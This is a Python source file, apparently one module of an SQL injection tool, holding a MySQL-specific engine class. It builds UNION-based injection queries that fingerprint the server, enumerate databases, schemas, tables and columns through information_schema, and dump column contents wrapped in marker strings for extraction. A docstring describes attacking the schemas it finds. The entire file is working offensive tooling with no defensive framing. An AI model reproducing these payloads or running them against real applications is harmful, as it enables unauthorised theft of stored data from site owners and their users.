from src.engines.sql_injection_engine import SQLInjectionEngine


class SQLInjectionEngineMySQL(SQLInjectionEngine):
    default_schemas = ('information_schema',)

    def __init__(self) -> None:
        super().__init__()

    def database_names(self) -> str:
        return "SHOW DATABASES"
    def version(self) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'version:', @@version, '{SQLInjectionEngine.injection_suffix}')"

    def schema(self, columns) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'schema:', schema_name COLLATE  utf8_general_ci, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.schemata"

    def tables(self, columns, schema_name) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'table:', table_name COLLATE  utf8_general_ci, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.tables WHERE table_schema LIKE '{schema_name}'"

    def column_names(self, columns, schema_name, table_name):
        if table_name is None:
            raise AssertionError("Table name cannot be null")
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'column:', column_name COLLATE  utf8_general_ci, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.columns WHERE table_schema LIKE '{schema_name}' AND table_name LIKE '{table_name}'"

    def query(self, columns, schema_name, table, column_name) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', '{column_name}:', {column_name}, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM {schema_name}.{table}"

    @staticmethod
    def schemas_names():
        """
        If we get the schemas we can attack them by typing USE `schema`
        inside the query to get more data
        """
        return "SELECT * FROM information_schema.schemata"

    @staticmethod
    def identify() -> str:
        return "EXISTS(select TABLE_NAME from information_schema.tables WHERE TABLE_NAME like 'INNODB%')"
